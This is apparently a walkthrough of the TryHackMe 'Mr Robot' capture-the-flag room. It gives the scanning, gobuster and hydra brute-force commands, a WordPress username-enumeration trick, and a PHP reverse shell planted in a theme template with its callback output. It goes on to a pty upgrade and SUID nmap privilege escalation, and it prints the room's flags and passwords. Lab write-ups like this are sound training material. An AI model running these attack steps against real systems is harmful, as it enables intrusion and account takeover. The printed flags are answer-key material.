---
description: Based on the Mr. Robot show, can you root this box?
---

# 💀 Mr Robot CTF

{% embed url="https://tryhackme.com/room/mrrobot" %}
[https://tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot)
{% endembed %}

| Room Attributes       | Value                                                                   |
| --------------------- | ----------------------------------------------------------------------- |
| Subscription Required |  <mark style="color:green;background-color:green;">False</mark> \[Free] |
| Type                  | Challenges (CTF)                                                        |
| Difficulty            |  <mark style="color:orange;background-color:yellow;">Medium</mark>      |
| Tags                  | OSINT, Internet, Dorks                                                  |

## Video Walkthrough

{% embed url="https://youtu.be/BQ4xeeNAbaw" %}
TryHackMe Mr Robot Official Walkthrough
{% endembed %}

## Task 1 - Connect to our network

### Go to your [access](http://tryhackme.com/access) page and download your configuration file.

{% hint style="success" %}
No answer needed
{% endhint %}

### Use an OpenVPN client to connect. In my example I am on Linux, on the access page we have a windows tutorial.

{% hint style="success" %}
No answer needed
{% endhint %}

### You are now ready to use our machines on our network!

{% hint style="success" %}
No answer needed
{% endhint %}

### Now when you deploy material, you will see an internal IP address of your Virtual Machine.

{% hint style="success" %}
No answer needed
{% endhint %}

## Task 2 - Hack the machine

### What is key 1?

Running [nmap](../difficulty-easy/nmap/) or [rustscan](../difficulty-easy/rustscan/) against the target returns two open ports on port 80 and 443.

```
rustscan -b 1500 -a TARGET_IP --range 1-1000
```

```
PORT STATE SERVICE REASON 
80/tcp open http syn-ack
443/tcp open https syn-ack
```

{% hint style="warning" %}
**HINT:** Robots
{% endhint %}

Checking the [robots.txt](https://www.cloudflare.com/en-gb/learning/bots/what-is-robots.txt/) file shows two interesting files:

* fsocity.dic
* key-1-of-3.txt

![robots.txt](../.gitbook/assets/Screenshot\_2022-06-24\_23-19-50.png)

**key-1-of-3.txt** contains the first flag:

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`073403c8a58a1f80d943455fb30724b9`

</details>

### What is key 2?

Next run dirb, dirbuster, or gobuster against the target to find some interesting URLs:

```
gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt
```

```
/.hta (Status: 403) [Size: 213]
/.htaccess (Status: 403) [Size: 218]
/.htpasswd (Status: 403) [Size: 218]
/0 (Status: 301) [Size: 0] [--> http://10.10.121.252/0/]
/admin (Status: 301) [Size: 235] [--> http://10.10.121.252/admin/]
/atom (Status: 301) [Size: 0] [--> http://10.10.121.252/feed/atom/]
/audio (Status: 301) [Size: 235] [--> http://10.10.121.252/audio/]
/blog (Status: 301) [Size: 234] [--> http://10.10.121.252/blog/]
```

`/0` opened a wordpress blog. Going to the login screen `http://TARGET_IP/wp-login.php` shows the wordpress login screen. Entering the username 'admin' and the password 'admin' presents an error message:

{% hint style="danger" %}
**ERROR**: Invalid username.
{% endhint %}

![](../.gitbook/assets/Screenshot\_2022-06-24\_23-18-55.png)

&#x20;This page can be used to enumerate valid usernames as when providing the username '`elliot`' ([the main character's name in Mr. Robot](https://mrrobot.fandom.com/wiki/Elliot\_Alderson)) the error states the password is wrong:

{% hint style="danger" %}
**ERROR**: The password you entered for the username **elliot** is incorrect.
{% endhint %}

![](../.gitbook/assets/Screenshot\_2022-06-24\_23-19-16.png)

Looking at `fsocity.dic` there are a number of duplicate entries so we can strip those out to optimise the wordlist:

```
sort fsocity.dic | uniq > fsocity-sorted.dic
```

We can then use [wpscan](https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation), [hydra](https://github.com/vanhauser-thc/thc-hydra), or [burp suite intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder/using) (slow) to brute force the password.

```
hydra -l 'elliot' -P Documents/THM/mrrobot/fsocity-sorted.dic TARGET_IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -t 16
```

You should find the password around the 5000th attempt.

<details>

<summary>Elliot's Password</summary>

`ER28-0652`

</details>

{% hint style="warning" %}
**HINT:** White coloured font
{% endhint %}

Once logged into wordpress as an admin we can check out the image gallery. One image has white text in the background which reveals another username  and also their password:

![hello friend](../.gitbook/assets/Screenshot\_2022-06-24\_23-16-57.png)

In order to turn our wordpress access into a shell we can edit the templates to add the [PHP PenTestMonkey](https://www.revshells.com/) reverse shell pointing to your tun0 IP address into the 404.php template file:

{% embed url="https://www.revshells.com/" %}
[https://www.revshells.com/](https://www.revshells.com/)
{% endembed %}

![Adding PHP PenTestMonkey reverse shell to the 404.php template file](../.gitbook/assets/Screenshot\_2022-06-24\_23-17-57.png)

Start a netcat listener on your machine then open the 404.php page in a browser to trigger the reverse shell.&#x20;

```
listening on [any] 4444 ... 
connect to [10.9.12.198] from (UNKNOWN) [10.10.121.252] 37394 
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux 19:03:27 up 46 min, 0 users, load average: 0.05, 0.06, 0.13 
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT 
uid=1(daemon) gid=1(daemon) groups=1(daemon) 
bash: cannot set terminal process group (1998): Inappropriate ioctl for device 
bash: no job control in this shell 
daemon@linux:/$
```

With a shell we can extract the md5 hash from password.raw-md5 from the daemon /home/robot/ directory:

```
daemon@linux:/$ cd /home/robot 
daemon@linux:/home/robot$ ls
key-2-of-3.txt 
password.raw-md5 
daemon@linux:/home/robot$ cat password.raw-md5 
robot:c3fcd3d76192e4007dfb496cca67e13b
```

We can reverse the hash using [crackstation](https://crackstation.net/):

{% embed url="https://crackstation.net/" %}
[https://crackstation.net/](https://crackstation.net/)
{% endembed %}

| Hash                               | Type | Result         |
| ---------------------------------- | ---- | -------------- |
| `c3fcd3d76192e4007dfb496cca67e13b` | md5  | (expand below) |

<details>

<summary>robot User Password</summary>

`abcdefghijklmnopqrstuvwxyz`

</details>

Trying to cat key-2-of-3.txt we find that we don't have adequate permissions:

```
daemon@linux:/home/robot$ cat key-2-of-3.txt 
cat: key-2-of-3.txt: Permission denied
```

Trying to run su results in an error message saying we need to run it in a terminal

```
daemon@linux:/home/robot$ su robot
su: must be run from a terminal
```

To get past this we need to upgrade our shell to a TTY shell:

{% embed url="https://netsec.ws/?p=337" %}
[https://netsec.ws/?p=337](https://netsec.ws/?p=337)
{% endembed %}

```
daemon@linux:/home/robot$ python -c 'import pty; pty.spawn("/bin/sh")'
```

```
$ su robot
Password: (expand above)
```

```
robot@linux:~$ cat key-2-of-3.txt
(reveal flag #2 below)
```

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`822c73956184f694993bede3eb39f959`

</details>

### What is key 3?

{% hint style="warning" %}
**HINT:** nmap
{% endhint %}

The final flag is in the root directory so in order to reach that we need to privilege escalate our current shell. Searching the filesystem for files with the SUID bit set we find that nmap is installed and SUID is set:

```
robot@linux:~$ find / -perm /4000
/bin/ping 
/bin/umount 
/bin/mount 
/bin/ping6 
/bin/su 
find: /etc/ssl/private': Permission denied 
/usr/bin/passwd 
/usr/bin/newgrp 
/usr/bin/chsh 
/usr/bin/chfn 
/usr/bin/gpasswd 
/usr/bin/sudo 
/usr/local/bin/nmap 
/usr/lib/openssh/ssh-keysign 
/usr/lib/eject/dmcrypt-get-device 
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper 
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper 
/usr/lib/pt_chown
```

GTFOBins shows the steps to run nmap in interactive mode which you can abuse to run commands as root:

{% embed url="https://gtfobins.github.io/gtfobins/nmap/" %}
[https://gtfobins.github.io/gtfobins/nmap/](https://gtfobins.github.io/gtfobins/nmap/)
{% endembed %}

```
nmap --interactive
nmap> !sh
```

```
robot@linux:~$ nmap --interactive
nmap --interactive                                                                           
                                                                                             
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )                                      
Welcome to Interactive Mode -- press h <enter> for help                                      
nmap> !sh                                                                                    
!sh                                                                                          
#                                                                                            
```

With root shell we can access the root directory and obtain our final flag!

```
# cd /root
cd /root
# ls
ls
firstboot_done  key-3-of-3.txt
# cat key-3-of-3.txt
cat key-3-of-3.txt
(reveal flag #3 below)
```

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`04787ddef27c3dee1ee161b21670b4e4`

</details>
